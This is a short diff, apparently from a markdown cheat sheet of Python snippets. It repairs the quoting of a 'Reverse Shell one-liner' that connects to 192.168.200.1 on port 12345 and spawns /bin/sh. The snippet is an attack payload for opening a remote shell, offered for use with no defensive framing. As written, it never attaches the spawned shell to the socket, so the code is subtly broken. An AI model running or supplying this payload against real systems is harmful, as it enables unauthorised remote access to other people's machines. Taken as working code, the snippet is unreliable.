@@ -30,5 +30,5 @@ print x
 ```
 ### Reverse Shell one-liner
 ```python
-python -c "import pty,socket;h,p='192.168.200.1',12345;socket.create_connection((h,p));pty.spawn('/bin/sh');
+python -c "import pty,socket;h,p='192.168.200.1',12345;socket.create_connection((h,p));pty.spawn('/bin/sh');"
 ```
